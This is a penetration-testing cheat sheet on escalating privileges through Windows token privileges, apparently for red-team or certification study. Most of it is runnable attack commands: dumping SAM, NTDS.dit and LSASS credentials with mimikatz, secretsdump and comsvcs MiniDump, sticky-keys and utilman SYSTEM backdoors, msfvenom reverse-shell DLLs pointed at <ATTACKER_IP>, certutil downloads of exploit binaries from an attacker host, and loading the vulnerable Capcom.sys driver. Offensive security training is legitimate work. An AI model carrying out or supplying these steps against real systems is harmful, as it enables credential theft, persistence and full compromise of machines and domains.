# SeBackupPrivilege — Privilege Escalation

## 🔍 Identify the Privilege

```cmd
whoami /priv
```

Look for:

```
SeBackupPrivilege        Back up files and directories    Enabled
```

---

## 📖 What is SeBackupPrivilege?

`SeBackupPrivilege` allows a process to **read any file** on the system, bypassing all ACLs and DACLs. This means you can read the SAM, SYSTEM, and NTDS.dit files — even without being an Administrator.

Commonly assigned to:
- **Backup Operators** group
- **Server Operators** group
- Backup software service accounts

---

## 🚀 Method 1: Dump SAM & SYSTEM Hives

### Directly with reg save

```cmd
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
reg save hklm\security C:\temp\security
```

### Extract on Kali

```bash
impacket-secretsdump -sam sam -system system -security security LOCAL
```

> ✅ This gives you local user NTLM hashes — crack or pass-the-hash.

---

## 🚀 Method 2: Copy Protected Files with robocopy

```cmd
# robocopy with /B flag uses Backup privileges
robocopy /B C:\Windows\System32\config C:\temp sam system security
```

---

## 🚀 Method 3: Dump NTDS.dit (Domain Controller)

If you're on a **Domain Controller** with SeBackupPrivilege:

### Create a shadow copy

```cmd
# Create a diskshadow script
echo "set context persistent nowriters" > script.txt
echo "add volume c: alias myalias" >> script.txt
echo "create" >> script.txt
echo "expose %myalias% z:" >> script.txt
echo "exit" >> script.txt

diskshadow /s script.txt
```

### Copy NTDS.dit from shadow

```cmd
robocopy /B z:\Windows\NTDS C:\temp NTDS.dit
reg save hklm\system C:\temp\system
```

### Extract on Kali

```bash
impacket-secretsdump -ntds NTDS.dit -system system LOCAL
```

> ✅ This dumps **every domain user hash**.

---

## 🚀 Method 4: Using wbadmin (Windows Backup)

```cmd
# Create backup of C drive
wbadmin start backup -backuptarget:\\<ATTACKER_IP>\share -include:C: -quiet

# Recover specific files
wbadmin start recovery -version:<backup_version> -itemType:File -items:C:\Windows\NTDS\NTDS.dit -recoverytarget:C:\temp -quiet
```

---

## 📚 References

- [MITRE ATT&CK T1003.003 — NTDS](https://attack.mitre.org/techniques/T1003/003/)
- [HackTricks — SeBackupPrivilege](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)

---
---

# SeRestorePrivilege — Privilege Escalation

## 🔍 Identify the Privilege

```cmd
whoami /priv
```

Look for:

```
SeRestorePrivilege       Restore files and directories    Enabled
```

---

## 📖 What is SeRestorePrivilege?

`SeRestorePrivilege` allows a process to **write to any file** on the system, bypassing all ACLs. You can overwrite system binaries, service executables, or DLLs.

Commonly assigned to:
- **Backup Operators** group
- **Server Operators** group

---

## 🚀 Method 1: Overwrite a Service Binary

**Find a service running as SYSTEM:**

```cmd
wmic service get name,pathname,startname | findstr /i "LocalSystem"
```

**Replace the service binary:**

```cmd
# Backup original
copy "C:\Program Files\VulnService\service.exe" "C:\Program Files\VulnService\service.exe.bak"

# Replace with reverse shell
copy C:\temp\reverse.exe "C:\Program Files\VulnService\service.exe"

# Restart the service
sc stop VulnService
sc start VulnService
```

---

## 🚀 Method 2: Overwrite utilman.exe (RDP Backdoor)

Replace `utilman.exe` with `cmd.exe` — then trigger it from the RDP login screen.

```cmd
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe /Y
```

**At the RDP login screen:** Press `Win + U` → gets a SYSTEM shell.

---

## 🚀 Method 3: Overwrite sethc.exe (Sticky Keys Backdoor)

```cmd
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /Y
```

**At the RDP login screen:** Press `Shift` 5 times → gets a SYSTEM shell.

---

## 🚀 Method 4: DLL Hijacking via Write Access

Write a malicious DLL to a location where a SYSTEM service loads DLLs.

```cmd
# Generate DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f dll -o evil.dll

# Copy to vulnerable path
copy evil.dll "C:\Program Files\VulnApp\missing.dll"
```

---

## 📚 References

- [HackTricks — SeRestorePrivilege](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)

---
---

# SeDebugPrivilege — Privilege Escalation

## 🔍 Identify the Privilege

```cmd
whoami /priv
```

Look for:

```
SeDebugPrivilege         Debug programs                   Enabled
```

---

## 📖 What is SeDebugPrivilege?

`SeDebugPrivilege` allows a process to **debug and inject into any process**, including SYSTEM processes. This means you can dump LSASS, inject shellcode, or migrate to a SYSTEM process.

Commonly assigned to:
- **Local Administrators** (by default)
- Developers/debugging accounts

---

## 🚀 Method 1: Dump LSASS (Credential Extraction)

### Using procdump

```cmd
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
```

### Using comsvcs.dll (no external tools)

```cmd
tasklist | findstr lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full
```

### Using Task Manager
1. Open Task Manager
2. Details tab → right-click `lsass.exe`
3. Create dump file

### Extract on Kali

```bash
pypykatz lsa minidump lsass.dmp
```

Or:

```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords
```

---

## 🚀 Method 2: Migrate to SYSTEM Process (Meterpreter)

```
meterpreter > ps
meterpreter > migrate <SYSTEM_PID>
meterpreter > getuid
```

Target processes running as SYSTEM:
- `winlogon.exe`
- `services.exe`
- `lsass.exe`
- `svchost.exe`

---

## 🚀 Method 3: Direct mimikatz

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords
```

This dumps plaintext passwords, NTLM hashes, and Kerberos tickets from memory.

---

## 🚀 Method 4: Inject into SYSTEM Process (Manual)

Using **process injection** with a tool like `psgetsys.ps1`:

```powershell
# Get PID of a SYSTEM process
Get-Process winlogon

# Inject and get SYSTEM shell
.\psgetsys.ps1 <WINLOGON_PID>
```

---

## 📚 References

- [MITRE ATT&CK T1003.001 — LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- [HackTricks — SeDebugPrivilege](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)

---
---

# SeTakeOwnershipPrivilege — Privilege Escalation

## 🔍 Identify the Privilege

```cmd
whoami /priv
```

Look for:

```
SeTakeOwnershipPrivilege  Take ownership of files or other objects  Enabled
```

---

## 📖 What is SeTakeOwnershipPrivilege?

`SeTakeOwnershipPrivilege` allows you to **take ownership of any object** (files, folders, registry keys) — even those owned by SYSTEM or other admins. Once you own it, you grant yourself full access.

---

## 🚀 Method 1: Take Ownership of SAM File

```cmd
# Take ownership
takeown /f "C:\Windows\System32\config\SAM"

# Grant yourself full access
icacls "C:\Windows\System32\config\SAM" /grant %username%:F

# Copy SAM
copy C:\Windows\System32\config\SAM C:\temp\sam
copy C:\Windows\System32\config\SYSTEM C:\temp\system
```

**Extract on Kali:**

```bash
impacket-secretsdump -sam sam -system system LOCAL
```

---

## 🚀 Method 2: Take Ownership of Sensitive Files

```cmd
# Take ownership of any file
takeown /f "C:\path\to\sensitive\file.txt"
icacls "C:\path\to\sensitive\file.txt" /grant %username%:F
type "C:\path\to\sensitive\file.txt"
```

**Examples of interesting targets:**

```cmd
# Admin's desktop
takeown /f "C:\Users\Administrator\Desktop" /R
icacls "C:\Users\Administrator\Desktop" /grant %username%:F /T

# NTDS.dit on DC
takeown /f "C:\Windows\NTDS\NTDS.dit"
icacls "C:\Windows\NTDS\NTDS.dit" /grant %username%:F
```

---

## 🚀 Method 3: Take Ownership of Registry Keys

```cmd
# Take ownership of a service registry key
# Then modify the service binary path

takeown /f "HKLM\SYSTEM\CurrentControlSet\Services\VulnService" /a
```

Or via PowerShell:

```powershell
$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\VulnService", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::TakeOwnership)
$acl = $key.GetAccessControl()
$acl.SetOwner([System.Security.Principal.NTAccount]"$env:USERNAME")
$key.SetAccessControl($acl)
```

---

## 📚 References

- [HackTricks — SeTakeOwnershipPrivilege](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)

---
---

# SeLoadDriverPrivilege — Privilege Escalation

## 🔍 Identify the Privilege

```cmd
whoami /priv
```

Look for:

```
SeLoadDriverPrivilege    Load and unload device drivers    Enabled
```

---

## 📖 What is SeLoadDriverPrivilege?

`SeLoadDriverPrivilege` allows a user to **load kernel drivers**. By loading a vulnerable driver (like Capcom.sys), you can execute arbitrary code in kernel mode and get SYSTEM.

---

## 🚀 Exploitation Steps

### Step 1: Download required tools

```
EoPLoadDriver.exe     — Loads a driver into the kernel
Capcom.sys            — Known vulnerable driver
ExploitCapcom.exe     — Exploits Capcom.sys to run commands as SYSTEM
```

### Step 2: Transfer to target

```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>/EoPLoadDriver.exe
certutil -urlcache -split -f http://<ATTACKER_IP>/Capcom.sys
certutil -urlcache -split -f http://<ATTACKER_IP>/ExploitCapcom.exe
```

### Step 3: Load the vulnerable driver

```cmd
.\EoPLoadDriver.exe System\CurrentControlSet\MyService C:\temp\Capcom.sys
```

### Step 4: Exploit and get SYSTEM

```cmd
.\ExploitCapcom.exe
```

> Modify ExploitCapcom source to run your reverse shell instead of cmd.exe if needed.

---

## ⚠️ Notes

- Capcom.sys is flagged by most AV — you may need to disable Defender first
- This technique works on Windows 7/8/10 and Server 2008/2012/2016
- On newer Windows, you may need to disable Driver Signature Enforcement

```cmd
# Disable Driver Signature Enforcement (requires reboot)
bcdedit /set testsigning on
```

---

## 📚 References

- [TarLogic — Abusing SeLoadDriverPrivilege](https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/)
- [GitHub — EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver)

---
---

# SeManageVolumePrivilege — Privilege Escalation

## 🔍 Identify the Privilege

```cmd
whoami /priv
```

Look for:

```
SeManageVolumePrivilege  Perform volume maintenance tasks   Enabled
```

---

## 📖 What is SeManageVolumePrivilege?

`SeManageVolumePrivilege` allows a user to **manage volumes**, which includes the ability to directly access the raw disk. This can be abused to **read any file** on the filesystem.

---

## 🚀 Method: Using SeManageVolumeExploit

### Step 1: Download the exploit

```
SeManageVolumeExploit.exe — Grants full access to C:\ drive
```

### Step 2: Transfer to target

```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>/SeManageVolumeExploit.exe
```

### Step 3: Run the exploit

```cmd
.\SeManageVolumeExploit.exe
```

This grants the current user **full access to the C:\ drive**, allowing you to read/write any file.

### Step 4: DLL Hijack for SYSTEM

After gaining write access, perform a DLL hijack on a SYSTEM service:

```cmd
# Generate malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f dll -o tzres.dll

# Copy to System32 (now writable)
copy tzres.dll C:\Windows\System32\wbem\tzres.dll

# Trigger the DLL load
systeminfo
```

---

## 📚 References

- [GitHub — SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)

---
---

# 📊 All Token Privileges — Quick Reference

| Privilege | What It Does | Escalation Method |
|---|---|---|
| **SeImpersonatePrivilege** | Impersonate tokens | Potato attacks (PrintSpoofer, GodPotato, etc) |
| **SeAssignPrimaryTokenPrivilege** | Assign process tokens | Potato attacks (same as above) |
| **SeBackupPrivilege** | Read any file | Dump SAM/SYSTEM/NTDS.dit |
| **SeRestorePrivilege** | Write any file | Overwrite service binary, utilman.exe |
| **SeDebugPrivilege** | Debug any process | Dump LSASS, inject into SYSTEM process |
| **SeTakeOwnershipPrivilege** | Own any object | Take ownership of SAM, admin files |
| **SeLoadDriverPrivilege** | Load kernel drivers | Load Capcom.sys → kernel exploit |
| **SeManageVolumePrivilege** | Volume maintenance | Raw disk access → DLL hijack |

---

# 🗺️ Decision Flowchart

```
whoami /priv
  │
  ├─ SeImpersonatePrivilege    → Potato attack (see SeImpersonatePrivilege.md)
  ├─ SeAssignPrimaryToken      → Potato attack (same tools)
  ├─ SeBackupPrivilege         → reg save SAM/SYSTEM → secretsdump
  ├─ SeRestorePrivilege        → Overwrite service binary or utilman.exe
  ├─ SeDebugPrivilege          → Dump LSASS → mimikatz/pypykatz
  ├─ SeTakeOwnershipPrivilege  → takeown SAM → secretsdump
  ├─ SeLoadDriverPrivilege     → Load Capcom.sys → kernel exploit
  └─ SeManageVolumePrivilege   → Raw disk read → DLL hijack
```

---

# 🔗 Tool Download Links

| Tool | GitHub |
|---|---|
| PrintSpoofer | [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer) |
| GodPotato | [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato) |
| SharpEfsPotato | [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) |
| Mimikatz | [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) |
| EoPLoadDriver | [TarlogicSecurity/EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver) |
| SeManageVolumeExploit | [CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit) |
| pypykatz | [skelsec/pypykatz](https://github.com/skelsec/pypykatz) |
| Impacket | [fortra/impacket](https://github.com/fortra/impacket) |